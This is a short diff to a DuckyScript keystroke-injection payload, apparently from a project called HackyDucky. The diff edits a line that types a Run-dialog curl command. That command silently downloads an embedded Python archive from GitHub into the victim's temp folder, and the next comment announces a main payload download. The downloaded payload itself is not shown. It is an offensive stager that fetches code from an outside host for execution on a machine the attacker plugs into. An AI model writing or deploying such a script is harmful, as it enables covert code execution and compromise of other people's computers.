@@ -65,10 +65,9 @@ END_FUNCTION
 DEFAULT_DELAY 50
 
 
-
-REM Download python
 RUN()
-STRINGLN curl -o "tmp.zip" "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/python-embedded.zip" -q -s --output-dir "%localappdata%\Temp\py\" --create-dirs
+REM Download python - also that's not an error idk why it doesn't work if path is closed quotes.
+STRINGLN curl -o "tmp.zip" "https://raw.githubusercontent.com/x-9917638/HackyDucky/refs/heads/main/python-embedded.zip" --create-dirs --output-dir "%localappdata%\Temp\py\
 
 REM Download main payload
 RUN()
